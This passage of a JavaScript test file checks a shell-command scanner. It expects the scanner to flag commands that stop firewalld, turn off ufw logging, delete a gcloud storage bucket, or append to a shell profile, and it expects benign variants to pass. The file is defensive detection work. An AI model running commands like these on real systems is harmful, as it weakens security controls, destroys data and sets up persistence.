    const stopped = scan("systemctl stop firewalld.service");
    expect(stopped.findings.some((finding) =>
      finding.ruleId === "system.firewall-disable"
    )).toBe(true);
    expect(scan("ufw logging off").findings.some((finding) =>
      finding.ruleId === "defense.security-control"
    )).toBe(true);
    expect(scan("sudo ufw logging off").findings).toEqual(expect.arrayContaining([
      expect.objectContaining({
        ruleId: "system.firewall-logging-disable",
        category: "system_modification",
        confidence: "high",
      }),
    ]));

    const hardNegatives = [
      "ufw status verbose",
      "ufw enable",
      "ufw prepend deny from 192.0.2.10",
      "ufw --help",
      "ufw logging on",
      "ufw logging low",
      "ufw logging medium",
      "ufw logging high",
      "ufw --dry-run logging off",
      "systemctl status ufw",
      "systemctl start firewalld",
      "service pf status",
      "pfctl -s rules",
    ];
    for (const source of hardNegatives) {
      expect(scan(source).findings.some((finding) =>
        finding.ruleId === "system.firewall-disable"
        || finding.ruleId === "system.firewall-logging-disable"
        || finding.ruleId === "defense.security-control"
      )).toBe(false);
    }
  });

  it("distinguishes cloud storage deletion from non-destructive remote operations", () => {
    const deletion = scan("gcloud storage buckets delete gs://example-bucket");
    expect(deletion.findings).toEqual(expect.arrayContaining([
      expect.objectContaining({
        ruleId: "network.cloud-storage-cli",
        category: "network_egress",
      }),
      expect.objectContaining({
        ruleId: "destructive.cloud-storage-delete",
        category: "destructive_behavior",
      }),
    ]));

    const remoteButNonDestructive = [
      "gcloud storage buckets list",
      "gcloud storage buckets describe gs://example-bucket",
      "gcloud storage buckets create gs://example-bucket",
      "gcloud storage cp ./artifact gs://example-bucket/artifact",
    ];
    for (const source of remoteButNonDestructive) {
      const result = scan(source);
      expect(result.findings.some((finding) =>
        finding.ruleId === "network.cloud-storage-cli"
      )).toBe(true);
      expect(result.findings.some((finding) =>
        finding.ruleId === "destructive.cloud-storage-delete"
      )).toBe(false);
    }

    const localOnly = [
      "gcloud storage --help",
      "echo 'gcloud storage buckets delete gs://example-bucket'",
    ];
    for (const source of localOnly) {
      expect(scan(source).findings.some((finding) =>
        finding.ruleId === "network.cloud-storage-cli"
        || finding.ruleId === "destructive.cloud-storage-delete"
      )).toBe(false);
    }
  });

  it("detects writes through profile path variables", () => {
    const result = scan(`command printf '%s' "$SOURCE" >> "$NVM_PROFILE"`);
    expect(result.findings.some((finding) => finding.category === "persistence")).toBe(true);
  });
});
